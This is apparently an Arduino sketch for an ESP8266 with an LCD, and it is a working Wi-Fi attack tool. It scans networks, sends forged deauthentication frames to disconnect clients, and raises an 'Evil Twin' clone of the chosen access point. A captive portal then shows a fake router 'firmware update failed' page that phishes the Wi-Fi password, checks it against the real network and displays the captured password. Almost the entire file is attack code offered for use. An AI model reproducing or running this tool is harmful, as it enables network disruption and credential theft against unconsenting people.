#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>

extern "C" {
#include "user_interface.h"
}

typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
}  _Network;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

_Network _networks[16];
_Network _selectedNetwork;

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }
}

String _correct = "";
String _tryPassword = "";

// Default main strings
#define SUBTITLE "ACCESS POINT RESCUE MODE"
#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> Firmware Update Failed"
#define BODY "Your router encountered a problem while automatically installing the latest firmware update.<br><br>To revert the old firmware and manually update later, please verify your password."

String header(String t) {
  String a = String(_selectedNetwork.ssid);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title><center>" + a + " :: " + t + "</center></title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style>"
             "<meta charset=\"UTF-8\"></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
}

// ===== Replace OLED with LCD =====
#include <Wire.h>
#include <LiquidCrystal_I2C.h>

// Common I2C address: 0x27 (use 0x3F if 0x27 doesn’t work)
LiquidCrystal_I2C lcd(0x27, 16, 2);

void setup() {
  Serial.begin(115200);

  lcd.init();
  lcd.backlight();
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Initializing...");

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("ESP8266PasswordCracker", "Balwant@024161");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();

  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Ready to Scan");
}

void performScan() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Scanning...");

  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
    updateOLEDNetworks(); // show available networks
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    }
    webServer.send(200, "text/html",
                   "<html><head><script> setTimeout(function(){window.location.href = '/';}, 4000); </script>"
                   "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<body><center><h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;width:60px;height:60px'>&#8855;</wrong><br>Wrong Password</h2><p>Please, try again.</p></center></body> </html>");
    Serial.println("Wrong password tried!");
  } else {
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;

    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Password Found!");
    lcd.setCursor(0, 1);
    lcd.print(_selectedNetwork.ssid);

    delay(1500);
    lcd.clear();
    lcd.setCursor(0, 0);
    lcd.print("Pass:");
    lcd.setCursor(0, 1);
    lcd.print(_tryPassword);

    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("ESP8266PasswordCracker", "Balwant@024161");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    Serial.println("Good password was entered!");
    Serial.println(_correct);
  }
}

String _tempHTML =
    "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
    "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
    "</head><body><div class='content'>"
    "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
    "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
    "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
    "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
    "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("Deauth Attack");
      lcd.setCursor(0, 1);
      lcd.print(_selectedNetwork.ssid);
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("Scanning...");
      performScan();
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("Evil Twin Attack");
      lcd.setCursor(0, 1);
      lcd.print(_selectedNetwork.ssid);

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      lcd.clear();
      lcd.setCursor(0, 0);
      lcd.print("Scanning...");
      performScan();

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("ESP8266PasswordCracker", "Balwant@024161");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  // HTML generation (unchanged)
  if (hotspot_active == false) {
    String _html = _tempHTML;
    for (int i = 0; i < 16; ++i) {
      if (_networks[i].ssid == "") break;
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" +
               String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";
      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6))
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      else
        _html += "<button>Select</button></form></td></tr>";
    }
    _html.replace("{deauth_button}", deauthing_active ? "Stop deauthing" : "Start deauthing");
    _html.replace("{deauth}", deauthing_active ? "stop" : "start");
    _html.replace("{hotspot_button}", hotspot_active ? "Stop EvilTwin" : "Start EvilTwin");
    _html.replace("{hotspot}", hotspot_active ? "stop" : "start");
    _html.replace("{disabled}", _selectedNetwork.ssid == "" ? " disabled" : "");
    if (_correct != "") _html += "</br><h3>" + _correct + "</h3>";
    _html += "</table></div></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html",
                     "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity...</h2></center></body> </html>");
    } else {
      webServer.send(200, "text/html", index());
    }
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0, wifinow = 0, deauth_now = 0;
uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t wifi_channel = 1;

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {
    wifi_set_channel(_selectedNetwork.ch);
    uint8_t deauthPacket[26] = {0xC0, 0x00};
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    Serial.println(WiFi.status() != WL_CONNECTED ? "BAD" : "GOOD");
    wifinow = millis();
  }
}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }


  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("ESP8266PasswordCracker", "Balwant@024161");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div></body></html>";
  webServer.send(200, "text/html", _html);

}

// Update networks on LCD (limited to 2 lines)
void updateOLEDNetworks() {
  lcd.clear();
  lcd.setCursor(0, 0);
  lcd.print("Networks:");
  if (_networks[0].ssid != "") {
    lcd.setCursor(0, 1);
    lcd.print(_networks[0].ssid);
  }
}
